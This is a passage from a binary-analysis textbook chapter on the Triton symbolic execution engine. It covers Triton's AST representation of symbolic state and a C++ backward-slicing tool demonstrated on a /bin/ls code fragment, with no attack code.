<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch13"><span epub:type="pagebreak" id="page_333"/><span class="big">13</span><br/>PRACTICAL SYMBOLIC EXECUTION WITH TRITON</h2>&#13;
<p class="noindent">In <a href="ch12.xhtml#ch12">Chapter 12</a>, you became familiar with the principles of symbolic execution. Now let’s build real symbex tools with Triton, a popular open source symbolic execution engine. This chapter demonstrates how to build a backward slicing tool, increase code coverage, and automatically exploit a vulnerability with Triton.</p>&#13;
<p class="indent">There are a handful of symbolic execution engines in existence, and only a few of them can operate on binary programs. The best-known binary-level symbex engines are Triton, angr,<sup><a id="ch13fn_1a" href="footnote.xhtml#ch13fn_1">1</a></sup> and S2E.<sup><a id="ch13fn_2a" href="footnote.xhtml#ch13fn_2">2</a></sup> KLEE is another well-known symbex engine that operates on LLVM bitcode instead of binary code.<sup><a id="ch13fn_3a" href="footnote.xhtml#ch13fn_3">3</a></sup> I’ll use Triton because it integrates easily with Intel Pin and is slightly faster because of its C++ backend. Other famous symbex engines include KLEE and S2E, which operate on LLVM bitcode instead of binary code.</p>&#13;
<h3 class="h3" id="ch13_1"><span epub:type="pagebreak" id="page_334"/>13.1 Introduction to Triton</h3>&#13;
<p class="noindent">Let’s start by taking a more detailed look at Triton’s main features. Triton is a free, open source binary analysis library that’s best known for its symbolic execution engine. It offers APIs for C/C++ and Python and currently supports the x86 and x64 instruction sets. You can download Triton and find documentation at <em><a href="https://triton.quarkslab.com">https://triton.quarkslab.com</a></em>. I’ve preinstalled Triton version 0.6 (build 1364) on the VM in the directory <em>~/triton</em>.</p>&#13;
<p class="indent">Triton, like <span class="literal">libdft</span>, is an experimental tool (there are currently no fully mature binary-level symbex engines). That means you may encounter bugs, which you can report at <em><a href="https://github.com/JonathanSalwan/Triton/">https://github.com/JonathanSalwan/Triton/</a></em>. Triton also needs a special, manually written handler for every type of instruction, telling the symbex engine about the effects that instruction has on the symbolic state. As a result, you may face incorrect results or errors if the program you’re analyzing uses instructions not supported by Triton.</p>&#13;
<p class="indent">I’ll use Triton for the practical symbex examples because it’s easy to use, is relatively well documented, and is written in C++, which gives it a performance advantage over engines written in languages like Python. Moreover, Triton’s concolic mode is based on Intel Pin, with which you’re already familiar.</p>&#13;
<p class="indent">Triton supports two modes, a <em>symbolic emulation mode</em> and a <em>concolic execution mode</em>, that correspond to the static (SSE) and dynamic (DSE) symbex philosophies. In both modes, Triton allows you to concretize part of the state to reduce the complexity of the symbolic expressions. Recall that SSE doesn’t really run a program but rather emulates it, while concolic execution does run the program and tracks symbolic state as metadata. As a result, symbolic emulation mode is slower than concolic mode because it must emulate each instruction’s effects on both the symbolic and concrete states, whereas concolic mode gets the concrete state “for free.”</p>&#13;
<p class="indent">Concolic execution mode relies on Intel Pin and must run the analyzed program from the start. In contrast, with symbolic emulation you can easily emulate only part of a program, such as a single function, rather than the whole program. In this chapter, you’ll see practical examples of both symbolic emulation mode and concolic mode. For a more complete discussion of the advantages and disadvantages of the two approaches, refer to <a href="ch12.xhtml#ch12">Chapter 12</a>.</p>&#13;
<p class="indent">Triton is foremost an offline symbex engine, in the sense that it explores only a single path at a time. But it also features a snapshot mechanism that allows you to concolically explore multiple paths without having to completely start over every time. Moreover, it incorporates a coarse-grained taint analysis engine with one color. While you won’t need these features in this chapter, you can learn more about them from Triton’s online documentation and examples.</p>&#13;
<p class="indent">Recent versions of Triton also allow you to plug in a different binary instrumentation platform instead of Pin and a different constraint solver of your choice. In this chapter, I’ll simply use the defaults, which are Pin and Z3. The Triton version installed on the VM specifically requires Pin <span epub:type="pagebreak" id="page_335"/>version 2.14 (71313), which you’ll also find preinstalled in <em>~/triton/pin -2.14-71313-gcc.4.4.7-linux</em>.</p>&#13;
<h3 class="h3" id="ch13_2">13.2 Maintaining Symbolic State with Abstract Syntax Trees</h3>&#13;
<p class="noindent">In both emulation mode and concolic mode, Triton maintains a global set of symbolic expressions, a mapping from registers and memory addresses to these symbolic expressions, and a list of path constraints, similar to <a href="ch12.xhtml#ch12fig1">Figure 12-1</a> from <a href="ch12.xhtml#ch12">Chapter 12</a>. Triton represents symbolic expressions and constraints as <em>abstract syntax trees (ASTs)</em>, with one AST per expression or constraint. An AST is a tree data structure that depicts the syntactic relationships between operations and operands. The AST nodes contain operations and operands in Z3’s SMT language.</p>&#13;
<p class="indent">For example, <a href="ch13.xhtml#ch13fig1">Figure 13-1</a> shows how the AST for the <span class="literal">eax</span> register evolves over the following sequence of three instructions:</p>&#13;
<p class="programs">shr eax,cl<br/>xor eax,0x1<br/>and eax,0x1</p>&#13;
<p class="indent">For each instruction, the figure shows two ASTs side by side: a full AST on the left and an AST with <em>references</em> on the right. Let’s first discuss the left side of the figure, and then I’ll explain the ASTs with references.</p>&#13;
<h5 class="h5">Full ASTs</h5>&#13;
<p class="noindent">The figure assumes that <span class="literal">eax</span> and <span class="literal">cl</span> initially map to unbounded symbolic expressions corresponding to a 32-bit symbolic value <em>α</em><sub>1</sub> and an 8-bit symbolic value <em>α</em><sub>2</sub>, respectively. For example, you can see that the initial state for <span class="literal">eax</span> <span class="ent">➊</span> is an AST rooted at a <span class="literal">bv</span> (<em>bitvector</em>) node, with two child nodes containing the values <em>α</em><sub>1</sub> and 32. This corresponds to an unbounded 32-bit Z3 bitvector, as in <span class="literal">(declare-const alpha1 (_ BitVec 32))</span>.</p>&#13;
<p class="indent">The <span class="literal">shr eax,cl</span> instruction is a logical right shift that uses <span class="literal">eax</span> and <span class="literal">cl</span> as its operands and stores the result in <span class="literal">eax</span>. Thus, after this instruction <span class="ent">➋</span>, the full AST for <span class="literal">eax</span> has a <span class="literal">bvlshr</span> (logical right shift) node as its root, with child trees representing the original ASTs for <span class="literal">eax</span> and <span class="literal">cl</span>. Note that the right child tree, representing <span class="literal">cl</span>’s contents, is rooted at a <span class="literal">concat</span> operation that prepends 24 zero bits to <span class="literal">cl</span>’s value. That’s necessary because <span class="literal">cl</span> is only 8 bits wide, but you have to widen it to 32 bits (the same width as <span class="literal">eax</span>) because the SMT-LIB 2.0 format that Z3 uses requires that both operands to the <span class="literal">bvlshr</span> have the same bit width.</p>&#13;
<p class="indent">After the <span class="literal">xor eax,0x1</span> instruction <span class="ent">➌</span>, the AST for <span class="literal">eax</span> becomes a <span class="literal">bvxor</span> node with <span class="literal">eax</span>’s previous AST as the left subtree and a constant bitvector containing the value <span class="literal">1</span> as the right subtree. Similarly, <span class="literal">and eax,0x1</span> <span class="ent">➍</span> results in an AST rooted at a <span class="literal">bvand</span> node, again with <span class="literal">eax</span>’s previous AST as the left subtree and a constant bitvector as the right.</p>&#13;
<div class="image"><a id="ch13fig1"/><img src="Images/f334-01.jpg" alt="image" width="694" height="1112"/></div>&#13;
<p class="fig-caption"><span epub:type="pagebreak" id="page_336"/><em>Figure 13-1: Effect of instructions on register abstract syntax trees</em></p>&#13;
<h5 class="h5"><span epub:type="pagebreak" id="page_337"/>ASTs with References</h5>&#13;
<p class="noindent">You may have noticed that the full ASTs contain lots of redundancy: every time an AST depends on a previous one, the entire previous AST becomes a subtree in the new one. Large and complex programs have many dependencies between operations, so the previous scheme causes unnecessary memory overhead. That’s why Triton represents ASTs more compactly, using references, as shown on the right side of <a href="ch13.xhtml#ch13fig1">Figure 13-1</a>.</p>&#13;
<p class="indent">In this scheme, each AST has a name like <span class="literal">ref!1</span>, <span class="literal">ref!2</span>, and so on, which you can refer to from another AST. This way, instead of having to copy an entire previous AST, you can simply refer to it by including a <em>reference node</em> in the new AST. For example, the right side of <a href="ch13.xhtml#ch13fig1">Figure 13-1</a> shows how the entire left subtree in <span class="literal">eax</span>’s AST after the <span class="literal">and eax,0x1</span> instruction can be replaced with a single reference node that refers to the previous AST, compressing 15 nodes into just 1 node.</p>&#13;
<p class="indent">Triton offers an API function called <span class="literal">unrollAst</span> that allows you to expand an AST with references into a full AST so that you can manually inspect it, manipulate it, or pass it to Z3. Now that you’re familiar with Triton’s basic workings, let’s learn how to use <span class="literal">unrollAst</span> and other Triton functions in practice by taking a look at some examples.</p>&#13;
<h3 class="h3" id="ch13_3">13.3 Backward Slicing with Triton</h3>&#13;
<p class="noindent">This first example implements backward slicing in Triton’s symbolic emulation mode. This example is a generalized version of an example that comes with Triton, which you’ll find in <em>~/triton/pin-2.14-71313-gcc.4.4.7-linux/ source/tools/Triton/src/examples/python/backward_slicing.py</em>. The original Triton tool uses the Python API, but here I’ll use Triton’s C/C++ API instead. You’ll see an example of a Triton tool written in Python in <a href="ch13.xhtml#ch13_5">Section 13.5</a>.</p>&#13;
<p class="indent">Recall that backward slicing is a binary analysis technique that tells you, at a certain point in the execution, which previous instructions contributed to the value of a given register or memory address. For example, let’s say you want to compute the backward slice at address <span class="literal">0x404b1e</span> with respect to <span class="literal">rcx</span> in the code fragment from <em>/bin/ls</em> shown in <a href="ch13.xhtml#ch13list1">Listing 13-1</a>.</p>&#13;
<p class="listing1" id="ch13list1"><em>Listing 13-1: Disassembly excerpt from</em> /bin/ls</p>&#13;
<p class="programs">  <span class="codestrong1">$ objdump -M intel -d /bin/ls</span><br/><br/>  ...<br/>  404b00:  49 89 cb           mov    r11,rcx<br/>  404b03:  48 8b 0f           mov    rcx,QWORD PTR [rdi]<br/>  404b06:  48 8b 06           mov    rax,QWORD PTR [rsi]<br/>  404b09:  41 56              push   r14<br/>  404b0b:  41 55              push   r13<br/>  404b0d:  41 ba 01 00 00 00  mov    r10d,0x1<br/>  404b13:  41 54              push   r12<br/>  404b15:  55                 push   rbp<br/>  404b16:  4c 8d 41 01        lea    r8,[rcx+0x1]<br/>  404b1a:  48 f7 d1           not    rcx<br/><span epub:type="pagebreak" id="page_338"/>  404b1d:  53                 push   rbx<br/><span class="ent">➊</span> 404b1e:  49 89 c9          mov    r9,rcx<br/>  ...</p>&#13;
<p class="indent">The backward slice consists of all the instructions that contribute to the value of <span class="literal">rcx</span> at address <span class="literal">0x404b1e</span> <span class="ent">➊</span>. Thus, the slice should include the instructions shown in the following listing:</p>&#13;
<p class="programs">404b03: mov rcx,QWORD PTR [rdi]<br/>404b1a: not rcx<br/>404b1e: mov r9,rcx</p>&#13;
<p class="indent">Now let’s see how to automatically compute backward slices like this with Triton. You’ll first learn to build a backward slicing tool and then use it to slice the code fragment shown in <a href="ch13.xhtml#ch13list1">Listing 13-1</a>, producing the same result as the manual slice you just saw.</p>&#13;
<p class="indent">Because Triton expresses symbolic expressions as ASTs that reference each other, it’s easy to compute a backward slice for a given expression. <a href="ch13.xhtml#ch13list2">Listing 13-2</a> shows the first part of the implementation of the backward slicing tool. As usual, I’ve omitted includes of standard C/C++ header files from the listing.</p>&#13;
<p class="listing1" id="ch13list2"><em>Listing 13-2:</em> backward_slicing.cc</p>&#13;
<p class="programs"><span class="ent">➊</span> #include "../inc/loader.h"<br/>  #include "triton_util.h"<br/>  #include "disasm_util.h"<br/><br/>  #include &lt;triton/api.hpp&gt;<br/>  #include &lt;triton/x86Specifications.hpp&gt;<br/><br/>  int<br/>  main(int argc, char *argv[])<br/>  {<br/>    Binary bin;<br/>    triton::API api;<br/>    triton::arch::registers_e ip;<br/>    std::map&lt;triton::arch::registers_e, uint64_t&gt; regs;<br/>    std::map&lt;uint64_t, uint8_t&gt; mem;<br/><br/>    if(argc &lt; 6) {<br/>      printf("Usage: %s &lt;binary&gt; &lt;sym-config&gt; &lt;entry&gt; &lt;slice-addr&gt; &lt;reg&gt;\n", argv[0]);<br/>      return 1;<br/>    }<br/><br/>    std::string fname(argv[1]);<br/>    if(load_binary(fname, &amp;bin, Binary::BIN_TYPE_AUTO) &lt; 0) return 1;<br/><br/><span epub:type="pagebreak" id="page_339"/><span class="ent">➋</span>   if(set_triton_arch(bin, api, ip) &lt; 0) return 1;<br/>     api.enableMode(triton::modes::ALIGNED_MEMORY, true);<br/><br/><span class="ent">➌</span>   if(parse_sym_config(argv[2], &amp;regs, &amp;mem) &lt; 0) return 1;<br/>     for(auto &amp;kv: regs) {<br/>       triton::arch::Register r = api.getRegister(kv.first);<br/>       api.setConcreteRegisterValue(r, kv.second);<br/>     }<br/>     for(auto &amp;kv: mem) {<br/>       api.setConcreteMemoryValue(kv.first, kv.second);<br/>     }<br/><br/>     uint64_t pc         = strtoul(argv[3], NULL, 0);<br/>     uint64_t slice_addr = strtoul(argv[4], NULL, 0);<br/>     Section *sec = bin.get_text_section();<br/><br/><span class="ent">➍</span>   while(sec-&gt;contains(pc)) {<br/>       char mnemonic[32], operands[200];<br/><span class="ent">➎</span>     int len = disasm_one(sec, pc, mnemonic, operands);<br/>       if(len &lt;= 0) return 1;<br/><br/><span class="ent">➏</span>     triton::arch::Instruction insn;<br/>       insn.setOpcode(sec-&gt;bytes+(pc-sec-&gt;vma), len);<br/>       insn.setAddress(pc);<br/><br/><span class="ent">➐</span>     api.processing(insn);<br/><br/><span class="ent">➑</span>     for(auto &amp;se: insn.symbolicExpressions) {<br/>         std::string comment = mnemonic; comment += " "; comment += operands;<br/>         se-&gt;setComment(comment);<br/>       }<br/><br/><span class="ent">➒</span>     if(pc == slice_addr) {<br/>         print_slice(api, sec, slice_addr, get_triton_regnum(argv[5]), argv[5]);<br/>         break;<br/>       }<br/><br/><span class="ent">➓</span>     pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));<br/>     }<br/><br/>     unload_binary(&amp;bin);<br/><br/>     return 0;<br/>   }</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_340"/>To use the tool, you provide it with the filename of the binary to analyze, a symbolic configuration file, the entry point address at which to start the analysis, the address at which to compute the slice, and the register with respect to which to compute the slice, all via command line arguments.</p>&#13;
<p class="indent">I’ll explain the purpose of the symbolic configuration file in a moment. Note that here, the entry point address is simply the address of the first instruction that the slicing tool will emulate; it doesn’t have to be the same as the binary’s entry point. For instance, to slice the example code from <a href="ch13.xhtml#ch13list1">Listing 13-1</a>, you use <span class="literal">0x404b00</span> as the entry point address so that the analysis emulates all the instructions shown in the listing up until the slice address.</p>&#13;
<p class="indent">The output of <span class="literal">backward_slicing</span> is a list of the assembly instructions that are in the slice. Now let’s take a more detailed look at how <span class="literal">backward_slicing</span> generates the program slice, starting with a more in-depth discussion of the necessary includes and the <span class="literal">main</span> function.</p>&#13;
<h4 class="h4" id="ch13_3_1"><em>13.3.1 Triton Header Files and Configuring Triton</em></h4>&#13;
<p class="noindent">The first thing you’ll notice in <a href="ch13.xhtml#ch13list2">Listing 13-2</a> is that it includes <em>../inc/loader.h</em> <span class="ent">➊</span> because <span class="literal">backward_slicing</span> uses the binary loader developed in <a href="ch04.xhtml#ch04">Chapter 4</a>. It also includes <em>triton_util.h</em> and <em>disasm_util.h</em>, which provide some utility functions I’ll describe shortly. Finally, there are two Triton-specific header files, both with the <em>.hpp</em> extension: <em>triton/api.hpp</em> provides the main Triton C<strong>++</strong> API, while <em>triton/x86Specifications.hpp</em> provides x86-specific definitions, such as register definitions. Besides including these header files, you must link with <span class="literal">-ltriton</span> to use Triton’s symbolic emulation mode.</p>&#13;
<p class="indent">The <span class="literal">main</span> function starts by loading the binary you’re analyzing using the <span class="literal">load_binary</span> function from the binary loader. Then, it configures Triton to the architecture of the binary using a function called <span class="literal">set_triton_arch</span> <span class="ent">➋</span>, defined in <em>backward_slicing.cc</em>, which I’ll discuss in detail in <a href="ch13.xhtml#ch13_3_4">Section 13.3.4</a>. It also calls Triton’s <span class="literal">api.enableMode</span> function to enable Triton’s <span class="literal">ALIGNED_MEMORY</span> mode, where <span class="literal">api</span> is an object of type <span class="literal">triton::API</span>, which is Triton’s main class that provides the C++ API.</p>&#13;
<p class="indent">Recall that symbolic memory accesses can greatly increase the size and complexity of the symbolic state because the symbex engine must model all possible outcomes of the memory access. Triton’s <span class="literal">ALIGNED_MEMORY</span> mode is an optimization that reduces the symbolic memory explosion by assuming that memory loads and stores access-aligned memory addresses. You can safely enable this optimization if you know memory accesses are aligned or if the precise memory addresses don’t matter for the analysis.</p>&#13;
<h4 class="h4" id="ch13_3_2"><em>13.3.2 The Symbolic Configuration File</em></h4>&#13;
<p class="noindent">In most of your symbex tools, you’ll want to make some registers and memory addresses symbolic or set them to specific concrete values. Which parts of the state you make symbolic and which concrete values you use depend on the application you’re analyzing and the paths you want to explore. Thus, if you hardcode the decisions on what state to symbolize and concretize, your symbex tool will be application specific.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_341"/>To prevent that, let’s create a simple <em>symbolic configuration file</em> format in which you can configure these decisions. There’s a utility function called <span class="literal">parse_sym_config</span>, defined in <em>triton_util.h</em>, that you can use to parse symbolic configuration files and load them into your symbex tool. The following listing shows an example symbolic configuration file:</p>&#13;
<p class="programs">%rax=0<br/>%rax=$<br/>@0x1000=5</p>&#13;
<p class="indent">In the symbolic configuration file format, you denote registers by <span class="literal">%</span><em>name</em> and memory addresses by <span class="literal">@</span><em>address</em>. You can assign concrete integers to each register or memory byte or make them symbolic by assigning the value <span class="literal">$</span>. For example, this configuration file assigns the concrete value <span class="literal">0</span> to <span class="literal">rax</span> and then makes <span class="literal">rax</span> symbolic and assigns the value <span class="literal">5</span> to the byte at memory address <span class="literal">0x1000</span>. Note that <span class="literal">rax</span> is symbolic but at the same time has a concrete value to drive the emulation to the correct path.</p>&#13;
<p class="indent">Now let’s get back to <a href="ch13.xhtml#ch13list2">Listing 13-2</a>. After loading the binary to analyze and configuring Triton, <span class="literal">backward_slicing</span> calls <span class="literal">parse_sym_config</span> to parse the symbolic configuration file specified on the command line <span class="ent">➌</span>. This function takes the filename of the configuration file as input, followed by two parameters that are both references to <span class="literal">std::map</span> objects in which <span class="literal">parse_sym_config</span> loads the configuration. The first <span class="literal">std::map</span> maps Triton register names (of an <span class="literal">enum</span> type called <span class="literal">triton::arch::registers_e</span>) to concrete <span class="literal">uint64_t</span> values containing the register contents, while the second <span class="literal">std::map</span> maps memory addresses to concrete byte values.</p>&#13;
<p class="indent">Actually, <span class="literal">parse_sym_config</span> takes two more optional parameters to load the lists of symbolic registers and memory addresses into. I haven’t used those here because to compute slices, you’re interested only in the ASTs that Triton builds, and by default Triton builds ASTs even for registers and memory locations that you haven’t explicitly made symbolic.<sup><a id="ch13fn_4a" href="footnote.xhtml#ch13fn_4">4</a></sup> You’ll see an example where you do need to explicitly symbolize some parts of the state in <a href="ch13.xhtml#ch13_4">Section 13.4</a>.</p>&#13;
<p class="indent">Directly after the call to <span class="literal">parse_sym_config</span>, the <span class="literal">main</span> function of <span class="literal">backward _slicing</span> contains two <span class="literal">for</span> loops. The first loops over the map of just-loaded concrete register values and tells Triton to assign these concrete values to its internal state. To do that, you call <span class="literal">api.setConcreteRegisterValue</span>, which takes a Triton register and a concrete integer value as input. Triton registers have the type <span class="literal">triton::arch::Register</span>, and you can obtain them from a Triton register name (of the <span class="literal">enum</span> type <span class="literal">triton::arch::registers_e</span>) using the <span class="literal">api.getRegister</span> function. Each register name has the form <span class="literal">ID_REG_</span><em>name</em>, where <em>name</em> is an uppercase register name like <span class="literal">AL</span>, <span class="literal">EBX</span>, <span class="literal">RSP</span>, and so on.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_342"/>Similarly, the second <span class="literal">for</span> loop goes over the map of concrete memory values and tells Triton about them using <span class="literal">api.setConcreteMemoryValue</span>, which takes a memory address and a concrete byte value as input.<sup><a id="ch13fn_5a" href="footnote.xhtml#ch13fn_5">5</a></sup></p>&#13;
<h4 class="h4" id="ch13_3_3"><em>13.3.3 Emulating Instructions</em></h4>&#13;
<p class="noindent">Loading the symbolic configuration file is the last part of the setup code for <span class="literal">backward_slicing</span>. Now, the main emulation loop that emulates instructions from the binary begins, starting at the user-specified entry point address and continuing until it hits the instruction at which to compute the slice. This sort of emulation loop is typical of nearly all symbolic emulation tools you’ll write with Triton.</p>&#13;
<p class="indent">The emulation loop is simply a <span class="literal">while</span> loop that stops when the slice is complete or when it encounters an instruction address outside of the binary’s <span class="literal">.text</span> section <span class="ent">➍</span>. To keep track of the current instruction address, there’s an emulated program counter called <span class="literal">pc</span>.</p>&#13;
<p class="indent">Each iteration of the loop starts by disassembling the current instruction using <span class="literal">disasm_one</span> <span class="ent">➎</span>, another utility function I’ve provided in <em>disasm_util.h</em>. It uses Capstone to obtain strings containing the instruction’s mnemonic and operands, needed in a moment.</p>&#13;
<p class="indent">Next, <span class="literal">backward_slicing</span> builds a Triton instruction object of type <span class="literal">triton:: arch::Instruction</span> for the current instruction <span class="ent">➏</span> and uses the <span class="literal">Instruction</span>’s <span class="literal">setOpcode</span> function to populate it with the instruction opcode bytes taken from the binary’s <span class="literal">.text</span> section. It also sets the <span class="literal">Instruction</span>’s address to the current <span class="literal">pc</span> using the <span class="literal">setAddress</span> function.</p>&#13;
<p class="indent">After creating a Triton <span class="literal">Instruction</span> object for the current instruction, the emulation loop <em>processes</em> the <span class="literal">Instruction</span> by calling the <span class="literal">api.processing</span> function <span class="ent">➐</span>. Despite its generic name, the <span class="literal">api.processing</span> function is central to Triton symbolic emulation tools because it performs the actual instruction emulation and advances Triton’s symbolic and concrete state based on the emulation results.</p>&#13;
<p class="indent">After the current instruction is processed, Triton will have built internal abstract syntax trees representing the symbolic expressions for register and memory states affected by the instruction. Later, you’ll see how to use these symbolic expressions to compute the backward slice. To produce a slice that contains x86 instructions, not symbolic expressions in SMT-LIB 2.0 format, you need to track which instruction is associated with each symbolic expression. The <span class="literal">backward_slicing</span> tool achieves that by looping over the list of all symbolic expressions associated with the just-processed instruction and decorating each expression with a comment that contains the instruction mnemonic and operand strings obtained earlier from the <span class="literal">disasm_one</span> function <span class="ent">➑</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_343"/>To access an <span class="literal">Instruction</span>’s list of symbolic expressions, you can use its <span class="literal">symbolicExpressions</span> member, which is an object of type <span class="literal">std::vector&lt;triton:: engines::symbolic::SymbolicExpression*&gt;</span>. The <span class="literal">SymbolicExpression</span> class provides a function called <span class="literal">setComment</span> that allows you to specify a comment string for a symbolic expression.</p>&#13;
<p class="indent">When the emulation reaches the slice address, <span class="literal">backward_slicing</span> calls a function called <span class="literal">print_slice</span> that computes and prints the slice and then breaks out of the emulation loop <span class="ent">➒</span>. Note that <span class="literal">get_triton_regnum</span> is another utility function from <em>triton_util.h</em> that returns the corresponding Triton register identifier based on a human-readable register name. Here, it returns the register identifier for the register to slice, to pass to <span class="literal">print_slice</span>.</p>&#13;
<p class="indent">When you call Triton’s <span class="literal">processing</span> function, Triton internally updates the concrete instruction pointer value to point to the next instruction. At the end of each emulation loop iteration, you get this new instruction pointer value using the function <span class="literal">api.getConcreteRegisterValue</span> and assign it to your own program counter (called <span class="literal">pc</span> in this example) that drives the emulation loop <span class="ent">➓</span>. Note that for 32-bit x86 programs, you need to fetch the contents of <span class="literal">eip</span>, while for x64 programs, the instruction pointer is <span class="literal">rip</span>. Let’s now take a look at how the <span class="literal">set_triton_arch</span> function mentioned earlier configures the <span class="literal">ip</span> variable with the identifier of the correct instruction pointer register for the emulation loop to use.</p>&#13;
<h4 class="h4" id="ch13_3_4"><em>13.3.4 Setting Triton’s Architecture</em></h4>&#13;
<p class="noindent">The <span class="literal">backward_slicing</span> tool’s <span class="literal">main</span> function calls <span class="literal">set_triton_arch</span> to configure Triton with the instruction set of the binary and get the name of the instruction pointer register used in that architecture. <a href="ch13.xhtml#ch13list3">Listing 13-3</a> shows how <span class="literal">set_triton_arch</span> is implemented.</p>&#13;
<p class="listing1" id="ch13list3"><em>Listing 13-3:</em> backward_slicing.cc <em>(continued)</em></p>&#13;
<p class="programs">  static int<br/>  set_triton_arch(Binary &amp;bin, triton::API &amp;api, triton::arch::registers_e &amp;ip)<br/>  {<br/><span class="ent">➊</span>   if(bin.arch != Binary::BinaryArch::ARCH_X86) {<br/>       fprintf(stderr, "Unsupported architecture\n");<br/>       return -1;<br/>     }<br/><br/><span class="ent">➋</span>   if(bin.bits == 32) {<br/><span class="ent">➌</span>     api.setArchitecture(triton::arch::ARCH_X86);<br/><span class="ent">➍</span>     ip = triton::arch::ID_REG_EIP;<br/>     } else if(bin.bits == 64) {<br/><span class="ent">➎</span>     api.setArchitecture(triton::arch::ARCH_X86_64);<br/><span class="ent">➏</span>     ip = triton::arch::ID_REG_RIP;<br/><br/><span epub:type="pagebreak" id="page_344"/>&#13;
    } else {<br/>      fprintf(stderr, "Unsupported bit width for x86: %u bits\n", bin.bits);<br/>      return -1;<br/>    }<br/><br/>    return 0;<br/> }</p>&#13;
<p class="indent">The function takes three parameters: a reference to the <span class="literal">Binary</span> object returned by the binary loader, a reference to the Triton API, and a reference to a <span class="literal">triton::arch::registers_e</span> in which to store the name of the instruction pointer register. If successful, <span class="literal">set_triton_arch</span> returns 0, and if there’s an error, it returns −1.</p>&#13;
<p class="indent">First, <span class="literal">set_triton_arch</span> ensures that it’s dealing with an x86 binary (either 32-bit or 64-bit) <span class="ent">➊</span>. If this is not the case, it returns with an error because Triton cannot currently deal with architectures other than x86.</p>&#13;
<p class="indent">If there’s no error, <span class="literal">set_triton_arch</span> checks the bit width of the binary <span class="ent">➋</span>. If the binary uses 32-bit x86, it configures Triton in 32-bit x86 mode (<span class="literal">triton::arch::ARCH_X86</span>) <span class="ent">➌</span> and sets <span class="literal">ID_REG_EIP</span> as the name of the instruction pointer register <span class="ent">➍</span>. Similarly, if it’s an x64 binary, it sets the Triton architecture to <span class="literal">triton::arch::ARCH_X86_64</span> <span class="ent">➎</span> and sets <span class="literal">ID_REG_RIP</span> as the instruction pointer <span class="ent">➏</span>. To configure Triton’s architecture, you use the <span class="literal">api.setArchitecture</span> function, which takes the architecture type as its only parameter.</p>&#13;
<h4 class="h4" id="ch13_3_5"><em>13.3.5 Computing the Backward Slice</em></h4>&#13;
<p class="noindent">To compute and print the actual slice, <span class="literal">backward_slicing</span> calls the <span class="literal">print_slice</span> function when the emulation hits the address at which to slice. You can see the implementation of <span class="literal">print_slice</span> in <a href="ch13.xhtml#ch13list4">Listing 13-4</a>.</p>&#13;
<p class="listing1" id="ch13list4"><em>Listing 13-4:</em> backward_slicing.cc <em>(continued)</em></p>&#13;
<p class="programs">   static void<br/>   print_slice(triton::API &amp;api, Section *sec, uint64_t slice_addr,<br/>               triton::arch::registers_e reg, const char *regname)<br/>   {<br/>     triton::engines::symbolic::SymbolicExpression *regExpr;<br/>     std::map&lt;triton::usize, triton::engines::symbolic::SymbolicExpression*&gt; slice;<br/>     char mnemonic[32], operands[200];<br/><br/><span class="ent">➊</span>    regExpr = api.getSymbolicRegisters()[reg];<br/><span class="ent">➋</span>    slice = api.sliceExpressions(regExpr);<br/><br/><span class="ent">➌</span>    for(auto &amp;kv: slice) {<br/>        printf("%s\n", kv.second-&gt;getComment().c_str());<br/>     }<br/><span epub:type="pagebreak" id="page_345"/><span class="ent">➍</span>   disasm_one(sec, slice_addr, mnemonic, operands);<br/>     std::string target = mnemonic; target += " "; target += operands;<br/><br/>     printf("(slice for %s @ 0x%jx: %s)\n", regname, slice_addr, target.c_str());<br/>  }</p>&#13;
<p class="indent">Recall that slices are computed with respect to a particular register, as specified by the <span class="literal">reg</span> parameter. To compute the slice, you need the symbolic expression associated with that register just after emulating the instruction at the slice address. To get this expression, <span class="literal">print_slice</span> calls <span class="literal">api.getSymbolicRegisters</span>, which returns a map of all registers to their associated symbolic expressions and then indexes that map to obtain the expression associated with <span class="literal">reg</span> <span class="ent">➊</span>. Then it obtains the slice of all symbolic expressions that contribute to <span class="literal">reg</span>’s expression using <span class="literal">api.sliceExpressions</span> <span class="ent">➋</span>, which returns the slice in the form of a <span class="literal">std::map</span> that maps integer expression identifiers to <span class="literal">triton::engines::symbolic::SymbolicExpression*</span> objects.</p>&#13;
<p class="indent">You now have a slice of symbolic expressions, but what you really want is a slice of x86 assembly instructions. This is precisely the purpose of the symbolic expression comments, which associate each expression with the assembly mnemonic and operand strings of the instruction that produced the expression. Thus, to print the slice, <span class="literal">print_slice</span> simply loops over the slice of symbolic expressions, gets their comments using <span class="literal">getComment</span>, and prints the comments to screen <span class="ent">➌</span>. For completeness, <span class="literal">print_slice</span> also disassembles the instruction at which you’re computing the slice and prints it to screen as well <span class="ent">➍</span>.</p>&#13;
<p class="indent">You can try the <span class="literal">backward_slice</span> program on the VM by running it as shown in <a href="ch13.xhtml#ch13list5">Listing 13-5</a>.</p>&#13;
<p class="listing1" id="ch13list5"><em>Listing 13-5: Computing the backward slice at</em> <span class="codeitalic">0x404b1e</span> <em>with respect to</em> <span class="codeitalic">rcx</span></p>&#13;
<p class="programs"><span class="codestrong1"><span class="ent">➊</span> $ ./backward_slicing /bin/ls empty.map 0x404b00 0x404b1e rcx</span><br/><span class="ent">➋</span> mov rcx, qword ptr [rdi]<br/>  not rcx<br/>  (slice for rcx @ 0x404b1e: mov r9, rcx)</p>&#13;
<p class="indent">Here, I’ve used <span class="literal">backward_slicing</span> to compute a slice over the code fragment from <em>/bin/ls</em> you saw in <a href="ch13.xhtml#ch13list1">Listing 13-1</a> <span class="ent">➊</span>. I’ve used an empty symbolic configuration file (<em>empty.map</em>) and specified <span class="literal">0x404b00</span>, <span class="literal">0x404b1e</span>, and <span class="literal">rcx</span> as the entry point address, the slice address, and the register to slice, respectively. As you can see, this produces the same output as the manually computed slice you saw before <span class="ent">➋</span>.</p>&#13;
<p class="indent">The reason it’s okay to use an empty symbolic configuration file in this example is that the analysis doesn’t rely on any particular registers or memory locations being symbolic, and you don’t need any specific concrete values to drive the execution since the code fragment you’re analyzing doesn’t contain any branches. Now let’s take a look at another example where you’ll need a nonempty symbolic configuration to explore multiple paths through the same program.</p>&#13;
<h3 class="h3" id="ch13_4"><span epub:type="pagebreak" id="page_346"/>13.4 Using Triton to Increase Code Coverage</h3>&#13;
